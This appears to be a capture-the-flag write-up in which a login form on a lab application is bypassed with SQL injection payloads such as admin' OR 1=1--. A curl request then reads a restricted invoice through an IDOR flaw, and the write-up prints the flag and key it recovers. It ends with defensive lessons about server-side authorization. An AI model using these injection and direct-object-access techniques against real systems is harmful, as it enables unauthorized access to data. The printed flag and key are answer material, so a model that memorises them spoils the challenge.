## Challenge Overview

Behind a public memorial-style page, Denver investigates the Directorate’s infrastructure and uncovers exposed endpoints and weak access controls.
The application claims to protect sensitive invoice data, but insecure authentication and authorization controls make it possible to retrieve restricted records.

The goal is to bypass access controls and extract proof that A₀ exists.

## Objective

Bypass authentication using SQL injection

Access restricted user functionality

Inspect client-side logic for sensitive behavior

Retrieve protected invoice data

Extract the key and flag

## Initial Access (SQL Injection)

The login functionality was vulnerable to basic SQL injection.

Using the payload:
```
admin' OR 1=1--
```

retrieved user details
```
oslo, helsinki, Raquel
```
Other inputs such as:
```
oslo' --
```

also confirmed improper query handling.

This allowed authentication bypass and access to internal pages.

## Client-Side Analysis

After logging in, the page source revealed sensitive logic in the frontend code:
```
fetch(`/invoices/${invoiceId}?format=json`)

if (invoice.id === 1057 && isUnauthorizedAccess) {
  // Extract flag and key from note
}
```

### This revealed:

There exists a special invoice with ID 1057

It contains the flag and key inside the note field

The restriction is enforced client-side, not server-side

This suggested an Insecure Direct Object Reference (IDOR) vulnerability.

## Exploitation (Direct API Access)

Instead of relying on the UI, the invoice endpoint was queried directly using curl with the session cookie.

### Request:
```
curl -H "Cookie: connect.sid=SESSION_COOKIE" \
http://10.60.0.227:5001/invoices/1057?format=json
```

### Response:
```
{"invoice":{"id":1057,"user_id":2,"owner":"helsinki","amount":206,"note":"Quarterly billing note: TDHCTF{DENVER_LAUGHS_AT_BROKEN_ACL} | Key: 6f46773092aa442662ec6181d37bb64cfb270223fa19994469258cd2e2ba6156"}}
```

The sensitive data was fully exposed due to missing server-side authorization checks.

## Key
6f46773092aa442662ec6181d37bb64cfb270223fa19994469258cd2e2ba6156

## Final Flag
TDHCTF{DENVER_LAUGHS_AT_BROKEN_ACL}

## Key Takeaways

SQL injection can still trivially bypass authentication

Client-side authorization is not real authorization

ID-based resources must always be validated server-side

Sensitive logic in frontend code often exposes the real attack path

Broken Access Control remains one of the most common real-world vulnerabilities
